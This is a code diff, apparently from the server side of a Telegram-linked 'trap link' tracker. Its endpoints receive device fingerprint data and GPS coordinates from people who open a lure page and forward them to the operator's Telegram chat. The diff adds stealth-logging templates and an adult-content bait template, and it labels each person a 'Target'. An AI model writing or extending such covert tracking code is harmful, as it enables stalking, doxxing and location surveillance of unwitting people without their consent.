@@ -125,17 +125,30 @@ async function startServer() {
     const chatId = getChatIdFromTrapId(id);
     if (botInstance && chatId) {
       const data = req.body;
+      const tmplId = data.tmplId || '1';
+      const templateName = templates[tmplId] ? templates[tmplId].name : 'Default';
       
-      const msg = `💻 <b>HARDWARE METADATA REVEALED</b> 💻\n` +
+      let header = '💻 <b>HARDWARE METADATA REVEALED</b> 💻';
+      let status = '🔍 <i>Target sedang berada di jendela permintaan GPS...</i>';
+
+      if (tmplId === '9') {
+        header = '🕵️ <b>STEALTH LOG ACQUIRED!</b> 🕵️';
+        status = '🏁 <i>Status: Silent Logging Berhasil (Tanpa GPS).</i>';
+      } else if (tmplId === '3') {
+        header = '🚀 <b>FAST LOG REVEALED</b> 🚀';
+        status = '🏁 <i>Status: Metadata Captured (Tanpa GPS).</i>';
+      }
+
+      const msg = `${header}\n` +
                   `━━━━━━━━━━━━━━━━━━━━\n` +
+                  `📁 <b>Template:</b> <code>${escapeHTML(templateName)}</code>\n` +
                   `🖥️ <b>Resolution:</b> <code>${escapeHTML(data.screen || 'N/A')}</code>\n` +
                   `🔋 <b>Battery:</b> <code>${escapeHTML(data.battery || 'N/A')}</code>\n` +
                   `🌍 <b>Timezone:</b> <code>${escapeHTML(data.timezone || 'N/A')}</code>\n` +
                   `⚙️ <b>Specs:</b> <code>${escapeHTML(String(data.cores || 'N/A'))} Core / ${escapeHTML(String(data.mem || 'N/A'))} GB RAM</code>\n` +
                   `🍎 <b>Platform:</b> <code>${escapeHTML(data.platform || 'N/A')}</code>\n` +
-                  `🔗 <b>Referrer:</b> <code>${escapeHTML(data.ref || 'Direct')}</code>\n` +
                   `━━━━━━━━━━━━━━━━━━━━\n` +
-                  `🔍 <i>Target sedang berada di jendela permintaan GPS...</i>`;
+                  `${status}`;
 
       botInstance.telegram.sendMessage(chatId, msg, { parse_mode: 'HTML' }).catch(console.error);
     }
@@ -146,10 +159,17 @@ async function startServer() {
     const id = req.params.id;
     const chatId = getChatIdFromTrapId(id);
     if (botInstance && chatId) {
-      const { lat, lon, acc } = req.body;
+      const { lat, lon, acc, tmplId } = req.body;
       const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
       
-      const msg = `📍 <b>GEOLOCATION FIX ACQUIRED!</b> 📍\n` +
+      let header = '📍 <b>GEOLOCATION FIX ACQUIRED!</b> 📍';
+      if (tmplId === '8') {
+        header = '🔞 <b>DI DEKAT KAMU ADA TARGET 18+!</b> 🔞';
+      } else if (tmplId === '5') {
+        header = '🛰️ <b>SYSTEM TRACKED TO COORDINATES!</b> 🛰️';
+      }
+
+      const msg = `${header}\n` +
                   `━━━━━━━━━━━━━━━━━━━━\n` +
                   `🛰️ <b>Latitude:</b> <code>${lat}</code>\n` +
                   `🛰️ <b>Longitude:</b> <code>${lon}</code>\n` +
